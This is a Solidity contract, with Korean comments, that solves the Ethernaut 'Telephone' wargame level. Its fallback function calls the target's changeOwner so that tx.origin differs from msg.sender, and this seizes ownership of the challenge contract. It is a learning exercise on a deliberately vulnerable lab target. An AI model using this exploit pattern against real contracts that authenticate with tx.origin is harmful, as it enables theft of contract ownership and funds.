// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {                                          // 컨트랙트 배포 시 Ethernaut에서 메인으로 사용하는 계정이 아닌 다른 계정으로 배포할 것!
    Telephone telephoneContract;
    address attacker;

    constructor (Telephone _telephoneContract, address _attacker) {
        telephoneContract = Telephone(_telephoneContract);          // Remix IDE에서 배포 시 Ethernaut에서 제공하는 문제 인스턴스 주소로 생성자 지정
        attacker = _attacker;                                       // Remix IDE에서 배포 시 owner로 지정되어야 하는 사용자 지갑 주소로 생성자 지정
    }

    fallback () external payable {                                  // 본 컨트랙트를 대상으로 이더리움 송금 시 Telephone 컨트랙트의 changeOwner 함수가 실행되도록 지정
        telephoneContract.changeOwner(attacker);
    }
}